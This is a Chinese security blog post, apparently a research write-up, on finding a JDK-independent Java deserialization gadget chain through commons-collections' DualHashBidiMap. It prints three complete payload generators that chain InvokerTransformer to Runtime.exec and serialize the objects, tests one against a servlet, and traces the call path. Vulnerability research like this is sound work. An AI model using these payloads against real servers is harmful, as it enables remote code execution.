# Java反序列化之与JDK版本无关的利用链挖掘

阅读量 **220512**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-01 10:30:01

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01055647990f3ecf0a.png)

## 一、前言：

总感觉年纪大了，脑子不好使，看过的东西很容易就忘了，最近两天又重新看了下java反序列化漏洞利用链相关技术，并尝试寻找新的利用链，最后找到commons-collections中的类DualHashBidiMap能够触发利用链，不依赖于JDK，然后对比了ysoserial代码，暂未发现使用DualHashBidiMap类的触发的方式，遂记之。

## 二、环境准备

JDK1.8

IDEA

commons-collections-3.1.jar

这里IDEA需要更改下调试情况下的配置，最好将划圈的两个标识去掉。这里在漏洞跟踪调试时可能会出现大坑。

Idea debug模式下

Enable alternative选项，idea会修改Collections对象结构

Enable toString选项，idea会自动调用 java类重写的toString() 函数

这两个选项在调试模式下可能会严重影响代码的执行流程。

我自己在跟踪TiedMapEntry代码时就遇到这个问题，TiedMapEntry类重写了toString()函数，我们的利用链都是Collections相关的对象，所以在调试时代码流程始终没有按照预期的执行，非调试模式下又都正常，后来发现了调试模式下的这两个选项影响了程序流程。

![](https://p4.ssl.qhimg.com/t01e405eb22a7d0f2b1.png)

## 二、历史利用链简单回顾

Java反序列化利用技术，总感觉长时间不看就记不清了，于是就重新回顾了下最基本的利用方式，分析跟踪了ChainedTransformer和InvokerTransformer流程，又看了两个触发readObject函数的类AnnotationInvocationHandler和BadAttributeValueExpException，大概对反序列化过程又有了个清晰的认识。这方面网上分析的文章已经很多了，具体过程不再赘述，下面仅贴下简单的利用代码，以供参考

    
    
    public static void generatePayload1() throws Exception {
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class,
                Class[].class
            },
            new Object[] {
                "getRuntime",
                new Class[0]
            }),
            new InvokerTransformer("invoke", new Class[] {
                Object.class,
                Object[].class
            },
            new Object[] {
                null,
                new Object[0]
            }),
            new InvokerTransformer("exec", new Class[] {
                String.class
            },
            new Object[] {
                "calc"
            })
        };
    
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        innermap.put("value", "value");
    
        Map payloadMap = TransformedMap.decorate(innermap, null, transformerChain);
        //在反序列化时，利用AnnotationInvocationHandler类的readObject触发
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor m_ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        m_ctor.setAccessible(true);
        Object payload_instance = m_ctor.newInstance(Retention.class, payloadMap);
        MySerializeUtil.serializeToFile(payload_instance, "CommonsCollections1Test1.ser");
    }
    
    
    public static void generatePayload2() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc" }) };
    
        //使用ChainedTransformer组合利用链
        Transformer transformerChain = new ChainedTransformer(transformers);
    
        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "haha");
    
        BadAttributeValueExpException payload_exception = new BadAttributeValueExpException(null);
        Field valField = payload_exception.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(payload_exception, entry);
        MySerializeUtil.serializeToFile(payload_exception, "CommonsCollections1Test2.ser");
    } 

## 三、新利用链挖掘

与其说是新利用链的挖掘，不如说新的触发点的寻找，上面两个利用链的漏洞触发类分别是JDK中的AnnotationInvocationHandler和BadAttributeValueExpException，在分析完上面两中利用链流程后，为了检验自己的认识水平，就想尝试自己寻找一个触发点。

寻找触发点唯一原则就是寻找一个实现了readObject()函数的类，并且在readObject()函数中执行了一定的操作。按照这个思路，先在idea中全局搜索readObject()函数

本来我只想找个触发点，并没想一定找个与JDK无关的，我先在依赖库中查找（如果找不到再到JDK中找），简单的过一遍找到的readObject函数,当看到org.apache.commons.collections.bidimap.DualHashBidiMap的readObject()函数时，感觉有可能达到触发利用链效果，代码如下

readObject中有多余的操作putAll(map)其代码如下

![](https://p3.ssl.qhimg.com/t01873ea39fa23db88c.png)

这里我们看到map进行了get(key)和get(value)操作。如果你之前分析过LazyMap的触发流程，我们就知道LazyMap.get(key)函数会触发ChainedTransformer和InvokerTransformer这个执行链，最后达到任意代码执行，LazyMap.get(key)代码如下。

![](https://p3.ssl.qhimg.com/t01bb0e6181e745b628.png)

看到这里，就感觉DualHashBidiMap类有戏，很有可能触发漏洞。于是简单的分析下该类的结构。

![](https://p0.ssl.qhimg.com/t01e183791d2d7fad9f.png)

writeObject()函数实现了了将maps[0]序列化，与readObject()中的Map map = (Map)
in.readObject();刚好对应，剩下的就是如何控制maps[0]的值，

    
    
    public abstract class AbstractDualBidiMap implements BidiMap {
        protected transient final Map[] maps = new Map[2];
    ...
        protected AbstractDualBidiMap(Map normalMap, Map reverseMap, BidiMap inverseBidiMap) {
            super();
            maps[0] = normalMap;
            maps[1] = reverseMap;
            this.inverseBidiMap = inverseBidiMap;
        }
    ...
    }

分析可知DualHashBidiMap的父类AbstractDualBidiMap中定义了maps变量，并且调用函数AbstractDualBidiMap()进行赋值。所有我们可以通过

    
    
    protected DualHashBidiMap(Map normalMap, Map reverseMap, BidiMap inverseBidiMap) {
        super(normalMap, reverseMap, inverseBidiMap);
    }

函数对maps进行赋值。

由与该函数是protected类型，所以需要使用反射机制。编写测试代码

    
    
    public static void generatePayload3() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc" }) };
        //使用ChainedTransformer组合利用链
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "haha");
        
        Map<String, Object> payload_map = new HashMap<String, Object>();
        payload_map.put("test", entry);
    
        Class cls = Class.forName("org.apache.commons.collections.bidimap.DualHashBidiMap");
        Constructor m_ctor = cls.getDeclaredConstructor(Map.class, Map.class, BidiMap.class);
        m_ctor.setAccessible(true);
        Object payload_instance = m_ctor.newInstance(payload_map, null, null);
    
        FileOutputStream fileOutputStream = new FileOutputStream("payload_dualHashBidMap1.ser");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(payload_instance);
        outputStream.close();
    }

编写简单的Servlet进行测试

![](https://p1.ssl.qhimg.com/t0167f5e4a913e16a37.png)

使用burpsuit发送，成功弹出计算器。

![](https://p3.ssl.qhimg.com/t01744df458e1b45883.png)

## 四、跟踪调试

![](https://p0.ssl.qhimg.com/t017e32cac984e060d2.png)

程序执行到putAll(map),此时map的值已经是我们构造的HashMap，并有value值LazyMap。

![](https://p0.ssl.qhimg.com/t0118dda218204384e8.png)

单步执行，观察变量的变化，程序执行玩maps[1].containsKey(value)之后弹出了计算器，与我们预测的有点不一样。重新运行程序，跟进containsKey(value)观察原因。

HaskMap的containsKey()函数如下，

    
    
    public boolean containsKey(Object key) {
        return getNode(hash(key), key) != null;
    }

其中hash(key)代码如下：

![](https://p4.ssl.qhimg.com/t01a5cbbcb890509740.png)

此时执行key.hashcode()，即执行TiedMapEntry.hashCode()

![](https://p5.ssl.qhimg.com/t011239ba76d62dcd55.png)

![](https://p2.ssl.qhimg.com/t01edb58cdca49589b0.png)

![](https://p0.ssl.qhimg.com/t01aa9543d8c2c2c140.png)

最后执行InvokerTransformer链，虽然与开始预测的有点不一样，但最终从另外一条路触发了关键函数。

整个漏洞触发的过程如下：

DualHashBidiMap->readObject()

DualHashBidiMap->putAll()

DualHashBidiMap->put()

HashMap->containsKey()

HashMap->hash()

TiedMapEntry->hashCode()

TiedMapEntry->getValue()

LazyMap->get()

ChainedTransformer->transform()

InvokerTransformer->transform()

由于整个过程触发readObject的类是在commons-collections库中的，后面执行代码的利用链也是在commons-collections中，所有整个利用链与jdk版本无关，只与commons-collections版本有关。

## 五、结束

在全局搜索readObject时，发现commons-collections中还有个类DualTreeBidiMap，和我们这里使用的DualHashBidiMap类几乎一样，猜测也能达到该效果，有兴趣的可以试下。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **PandaIsCoding** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/232415](/post/id/232415)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Java](/tag/Java)
  * [Ysoserial](/tag/Ysoserial)
  * [双倍活动](/tag/双倍活动)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t011f2416f5f80ad992.jpg)
PandaIsCoding

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

